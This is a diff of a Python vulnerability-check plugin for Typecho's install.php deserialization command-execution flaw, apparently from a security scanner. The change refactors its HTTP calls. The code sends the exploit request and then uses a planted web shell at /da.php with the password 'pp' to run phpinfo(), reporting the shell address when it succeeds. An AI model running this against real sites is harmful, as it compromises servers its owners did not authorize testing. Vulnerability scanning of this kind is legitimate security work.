@@ -5,9 +5,8 @@ name: typecho install.php反序列化命令执行漏洞
 author: Luciferdescription: typecho install.php反序列化命令执行漏洞
 '''
 
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Typecho_Install_Code_Exec_BaseVerify:
     def __init__(self, url):
@@ -24,12 +23,12 @@ class Typecho_Install_Code_Exec_BaseVerify:
     def run(self):
         check_url = self.url + "/install.php?finish=1"
         try:
-            req = requests.get(check_url, headers = self.headers, verify = False, allow_redirects = False, timeout = 10)
+            req = request.get(check_url, headers = self.headers)
             shellpath = self.url + "/da.php"
             post_data ={
                 "pp":"phpinfo();"
             }
-            check_req = requests.post(self.url + "/da.php", data = post_data, headers = self.headers,  allow_redirects = False,  verify = False, timeout = 10)
+            check_req = request.post(self.url + "/da.php", data = post_data, headers = self.headers)
             if r"Configuration File (php.ini) Path" in check_req.text:
                 print("存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: " + check_url + "\tshell地址: " + shellpath + "\t密码: pp")
                 return True
